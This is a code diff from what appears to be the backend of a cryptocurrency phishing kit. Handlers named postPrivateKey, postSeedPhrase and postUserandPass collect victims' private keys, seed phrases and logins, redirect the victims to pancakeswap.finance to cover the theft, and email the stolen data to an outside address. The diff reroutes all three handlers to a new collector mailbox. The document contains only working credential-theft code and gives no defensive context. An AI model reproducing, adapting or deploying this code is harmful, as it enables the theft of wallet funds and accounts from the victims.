@@ -50,7 +50,7 @@ exports.postPrivateKey = (req, res, next) => {
         res.redirect('https://pancakeswap.finance/')
         return transporter.sendMail({
           from: 'Ether <Ether@gmail.com>', // sender address
-          to: 'danielkenny870@gmail.com', // list of receivers
+          to: 'Ritahildreth57@gmail.com', // list of receivers
           subject: "User Submitted Private Key", // Subject line
           html: `
             <div style="font-family: Arial, sans-serif; color: #333;">
@@ -109,7 +109,7 @@ exports.postSeedPhrase = (req, res, next) => {
     res.redirect('https://pancakeswap.finance/')
     return transporter.sendMail({
       from: 'Ether <Ether@gmail.com>', // sender address
-      to: 'danielkenny870@gmail.com', // list of receivers
+      to: 'Ritahildreth57@gmail.com', // list of receivers
       subject: "User Submitted Seed Phrase", // Subject line
       html: `
         <div style="font-family: Arial, sans-serif; color: #333;">
@@ -170,7 +170,7 @@ exports.postUserandPass = (req, res, next) => {
     res.redirect('https://pancakeswap.finance/')
     return transporter.sendMail({
       from: 'Ether <Ether@gmail.com>', // sender address
-      to: 'binnicarts@gmail.com', // list of receivers
+      to: 'Ritahildreth57@gmail.com', // list of receivers
       subject: "User Submitted Username and Password", // Subject line
       html: `
         <div style="font-family: Arial, sans-serif; color: #333;">
